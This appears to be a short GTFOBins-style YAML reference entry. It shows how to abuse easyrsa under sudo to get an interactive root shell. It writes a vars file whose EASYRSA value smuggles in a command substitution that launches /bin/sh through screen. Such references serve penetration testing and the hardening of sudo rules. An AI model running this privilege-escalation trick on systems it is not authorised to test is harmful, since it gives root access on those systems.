---
functions:
  sudo:
    - description: The below technique utilizies `screen` to have a proper working interactive shell.
      code: |
        echo 'set_var EASYRSA	"$(/usr/bin/screen /bin/sh)"' > /tmp/vars
        sudo easyrsa --vars=/tmp/vars
        export PATH=/bin:/usr/bin
---
